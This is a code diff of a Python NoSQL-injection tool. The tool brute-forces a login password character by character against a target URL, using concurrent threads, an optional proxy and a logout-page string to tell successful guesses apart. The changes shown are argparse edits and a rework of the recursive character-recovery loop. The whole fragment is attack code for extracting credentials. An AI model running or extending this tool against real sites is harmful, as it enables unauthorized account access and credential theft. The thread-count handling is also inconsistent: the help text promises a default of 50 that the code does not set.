@@ -54,21 +54,20 @@ import threading
 import sys
 
 parser = argparse.ArgumentParser(description='NoSQL Injection')
-parser.add_argument('-u', '--URL', type=str, metavar='', required=True, help='Target URL (e.g. "http:#www.example.com/login")')
-parser.add_argument('-d', '--data', type=str, metavar='', required=False, help='Data string to be sent through POST')
-parser.add_argument('-w', '--wordlist', type=str, metavar='', required=False, help='Path to the wordlist')
-parser.add_argument('-U', '--Username', type=str, metavar='', required=True, help='Name of the username parameter')
-parser.add_argument('-P', '--Password', type=str, metavar='', required=False, help='Name of the password parameter')
-parser.add_argument('-p', '--proxy', type=str, metavar='', required=False, help='Use a proxy to connect to the target URL (e.g. "127.0.0.1:8080")')
+parser.add_argument('-u', '--URL', type=str, metavar='URL', required=True, help='Target URL (e.g. "http:#www.example.com/login")')
+parser.add_argument('-d', '--data', type=str, metavar='Data', required=False, help='Data string to be sent through POST')
+parser.add_argument('-w', '--wordlist', type=str, metavar='Wordlist', required=False, help='Path to the wordlist')
+parser.add_argument('-U', '--Username', type=str, metavar='Username', required=True, help='Name of the username parameter')
+parser.add_argument('-p', '--proxy', type=str, metavar='Proxy', required=False, help='Use a proxy to connect to the target URL (e.g. "127.0.0.1:8080")')
 parser.add_argument('-v', '--verbose', required=False, help='verbose mode', action='store_true')
-parser.add_argument('-Lo', '--LogoutIdentifier', type=str, metavar='', required=True, help='String identifier from logged out page')
-parser.add_argument('-t', '--Threads', type=str, metavar='', required=False, help='Number of concurrent thread')
+parser.add_argument('-Lo', '--LogoutIdentifier', type=str, metavar='Logout-Identifier', required=True, help='String identifier from logged out page')
+parser.add_argument('-t', '--Threads', type=str, metavar='Threads', required=False, help='Number of concurrent thread, Default 50')
 args = parser.parse_args()
 
 URL = args.URL
 Username = args.Username
 LogoutIdentifier = args.LogoutIdentifier
-Thread = 80
+Thread = 0
 Thread = int(args.Threads)
 Proxy = args.proxy
 
@@ -124,21 +123,18 @@ def FindChar():
             else:
                 processes.append(executor.submit(get_url, password + c))
 
-    index = 0
     for task in as_completed(processes):
         CharPass = True
         if LogoutIdentifier in task.result():
             CharPass = False
 
         if CharPass == True:
-            charc = task.result().split(maxsplit=1)
-            password = charc[0]
+            c = task.result().split(maxsplit=1)
+            password = c[0]
                             
             if args.verbose:
-                print(Fore.GREEN + "\rFound password charecter : %s   Password : %s" % (charc[index], charc[0]))
+                print(Fore.GREEN + "\rFound password charecter : %s   Password : %s" % (password[-1], password))
                 print(Style.RESET_ALL)
-                #os.system('clear') 
-            index +=1
             FindChar()
 
         if password[-3:] == "$$$":
